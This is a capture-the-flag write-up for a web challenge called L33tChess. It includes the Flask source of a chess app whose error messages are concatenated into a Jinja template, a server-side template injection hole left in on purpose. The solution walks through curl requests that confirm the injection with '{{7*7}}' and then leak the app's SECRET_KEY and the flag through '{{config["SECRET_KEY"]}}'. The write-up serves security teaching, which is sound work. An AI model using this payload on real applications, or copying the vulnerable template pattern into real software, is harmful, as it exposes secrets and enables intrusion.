
# L33tChess

 * Category: Web
 * Solved by the JCTF Team

## Description

> The board is set, the pieces are in place: but one careless move gives you control.
> 
> Can you find the exploit and checkmate the app?

The application sources were attached.

<details>

<summary>Click to view sources...</summary>

#### index.py

```python
from flask import Flask, session, render_template_string, request, redirect
import chess
import chess.svg
import os

app = Flask(__name__)
app.secret_key = os.getenv("FLAG", "your_flag")

def render_piece_svg(piece):
    return chess.svg.piece(piece, size=50)


def describe_move(move_uci, board):
    try:
        move = chess.Move.from_uci(move_uci)

        piece = board.piece_at(move.from_square)
        if piece:
            piece_name = piece.piece_type
            piece_names = {
                chess.PAWN: "pawn",
                chess.KNIGHT: "knight",
                chess.BISHOP: "bishop",
                chess.ROOK: "rook",
                chess.QUEEN: "queen",
                chess.KING: "king"
            }
            color = "white" if piece.color == chess.WHITE else "black"
            piece_str = piece_names.get(piece_name, "piece")
            from_square = chess.square_name(move.from_square)
            to_square = chess.square_name(move.to_square)
            msg =  f"moving the {color} {piece_str} from {from_square} to {to_square}"
        else:
            msg = "no piece on the source square."

        if move in board.legal_moves:
            board.push(move)
            session["fen"] = board.fen()
            if board.is_checkmate():
                msg = "<b>Checkmate:</b> "+msg + " #"
            elif board.is_check():
                msg = "Check: "+msg
     
            return '<h3 id="msg" style="color:green">'+msg+'</h3>'
        
        else:
            return '<h3 id="msg" style="color:red">Illegal: '+msg+'</h3>'

        
    except Exception as e:
        return '<h3 hidden id="msg" style="color:red">'+str(e)+'</h3>'


def create_template():
    return  '''
        <title>Chess</title>
        <style>
            #board {
               display: grid;
                grid-template-columns: repeat(8, 60px);
                width: 480px;
                margin: auto;
            }
            .square {
                width: 60px;
                height: 60px;
                background-color: #f0d9b5;
                border: 1px solid black;
                position: relative;
            }
            .square.dark {
                background-color: #b58863;
            }
            .piece {
                position: absolute;
                cursor: grab;
            }
            #msg {
                font: italic bold 16px Arial, sans-serif;
                text-align: center;
            }

        </style>
        <h2 style="text-align:center">Turn: {{ "White" if turn else "Black" }}</h2>''' + session.get("msg", "")  + \
        '''<button onclick="location.href='/reset'" style="display:block; margin: 20px auto;">Reset</button>
        <div id="board">
           {% for rank in range(8, 0, -1) %}
    {% set rank_index = loop.index0 %}
    {% for file in "abcdefgh" %}
        {% set file_index = loop.index0 %}
        {% set square = file + rank|string %}
        {% set is_dark = (file_index + rank_index) % 2 == 1 %}
        <div class="square {% if is_dark %}dark{% endif %}" data-square="{{ square }}">
            {% if board.get(square) %}
                <div class="piece" data-square="{{ square }}" draggable="true">
                    {{ board[square]|safe }}
                </div>
            {% endif %}
        </div>
    {% endfor %}
{% endfor %}

        </div>

        <script>
            let dragged = null;
            let from = null;

            document.querySelectorAll('.piece').forEach(piece => {
                piece.addEventListener('dragstart', e => {
                    dragged = piece;
                    from = piece.dataset.square;
                });
            });

            document.querySelectorAll('.square').forEach(square => {
                square.addEventListener('dragover', e => e.preventDefault());
                square.addEventListener('drop', e => {
                    e.preventDefault();
                    const to = square.dataset.square;
                    const uci = from + to;
                    fetch('/move', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ move: uci })
                    }).then(() => window.location.reload());
                });
            });
        </script>
  '''
@app.route("/reset")
def reset():
    session.clear()
    return redirect("/")

@app.route("/move", methods=["POST"])
def move():
    fen = session.get("fen", None)
    if not fen:
        board = chess.Board()
        session["fen"] = board.fen()
    else:
        board = chess.Board(fen)
        
    data = request.get_json()
    move_uci = data.get("move")
    session["msg"] = describe_move(move_uci, board)
    return redirect("/")

@app.route("/")
def index():
    fen = session.get("fen", None)
    if not fen:
        board = chess.Board()
        session["fen"] = board.fen()
    else:
        board = chess.Board(fen)

    board_map = {}
    for square in chess.SQUARES:
        piece = board.piece_at(square)
        if piece:
            board_map[chess.square_name(square)] = render_piece_svg(piece)
    return render_template_string(create_template(), board=board_map, turn=board.turn)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

```

</details>


## Solution

This is a simple interactive chess application backed by the python
`chess` package. When we make a move, the GUI will trigger a request to the `/move` API
behind the scenes. This API reads the `move` parameter provided by the GUI (which is
supposed to be the combination of the `from` and `to` locations representing the move,
e.g. `d2d4`). It is then passed to `describe_move`, which passes it directly to 
`chess.Move.from_uci(move_uci)`.

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/L33tChess]
└─$ curl 'https://l33tchess.appsecil.ctf.today/reset' --cookie cookie.txt --cookie-jar cookie.txt -s
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.

┌──(user@kali3)-[/media/sf_CTFs/appsec/L33tChess]
└─$ curl 'https://l33tchess.appsecil.ctf.today/move' --cookie cookie.txt --cookie-jar cookie.txt -X POST -H 'Content-Type: application/json' -L --data-raw '{"move":"d2d4"}'
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>

┌──(user@kali3)-[/media/sf_CTFs/appsec/L33tChess]
└─$ curl 'https://l33tchess.appsecil.ctf.today/' --cookie cookie.txt --cookie-jar cookie.txt -s | grep msg
            #msg {
        <h2 style="text-align:center">Turn: Black</h2><h3 id="msg" style="color:green">moving the white pawn from d2 to d4</h3><button onclick="location.href='/reset'" style="display:block; margin: 20px auto;">Reset</button>
```

Let's see what happens when we make an illegal move:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/L33tChess]
└─$ curl 'https://l33tchess.appsecil.ctf.today/move' --cookie cookie.txt --cookie-jar cookie.txt -X POST -H 'Content-Type: application/json' -L --data-raw '{"move":"test"}'
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>

┌──(user@kali3)-[/media/sf_CTFs/appsec/L33tChess]
└─$ curl 'https://l33tchess.appsecil.ctf.today/' --cookie cookie.txt --cookie-jar cookie.txt -s | grep msg
            #msg {
        <h2 style="text-align:center">Turn: Black</h2><h3 hidden id="msg" style="color:red">invalid uci: 'test'</h3><button onclick="location.href='/reset'" style="display:block; margin: 20px auto;">Reset</button>
```

The text from our illegal move got embedded directly into the HTML response!

This happens since `describe_move` passes our move directly to `chess.Move.from_uci`, which expects legal move format and
throws an exception when it doesn't receive one. The exception includes the illegal string, which gets returned by the following code 
(and saved in a session variable):

```python
    try:
        move = chess.Move.from_uci(move_uci)
        # ...
    except Exception as e:
        return '<h3 hidden id="msg" style="color:red">'+str(e)+'</h3>'
```

When the next request to the page is executed, `create_template` will include the session variable directly as part of the template!
This means that we can try to execute a template injection attack, for example:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/L33tChess]
└─$ curl 'https://l33tchess.appsecil.ctf.today/move' --cookie cookie.txt --cookie-jar cookie.txt -X POST -H 'Content-Type: application/json' -L --data-raw '{"move":"{{7*7}}"}'
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>

┌──(user@kali3)-[/media/sf_CTFs/appsec/L33tChess]
└─$ curl 'https://l33tchess.appsecil.ctf.today/' --cookie cookie.txt --cookie-jar cookie.txt -s | grep msg
            #msg {
        <h2 style="text-align:center">Turn: Black</h2><h3 hidden id="msg" style="color:red">expected uci string to be of length 4 or 5: '49'</h3><button onclick="location.href='/reset'" style="display:block; margin: 20px auto;">Reset</button>
```

Once we've confirmed that `{{7*7}}` gets rendered to `49`, we can go get the flag:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/L33tChess]
└─$ curl 'https://l33tchess.appsecil.ctf.today/move' --cookie cookie.txt --cookie-jar cookie.txt -X POST -H 'Content-Type: application/json' -L --data-raw '{"move":"{{config[\"SECRET_KEY\"]}}"}'
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>

┌──(user@kali3)-[/media/sf_CTFs/appsec/L33tChess]
└─$ curl 'https://l33tchess.appsecil.ctf.today/' --cookie cookie.txt --cookie-jar cookie.txt -s | grep msg                                                                                     #msg {
        <h2 style="text-align:center">Turn: Black</h2><h3 hidden id="msg" style="color:red">expected uci string to be of length 4 or 5: 'AppSec-IL{Ch3SSTI_1s_a_wInnIg_m0v3}'</h3><button onclick="location.href='/reset'" style="display:block; margin: 20px auto;">Reset</button>
```

The flag: `AppSec-IL{Ch3SSTI_1s_a_wInnIg_m0v3}`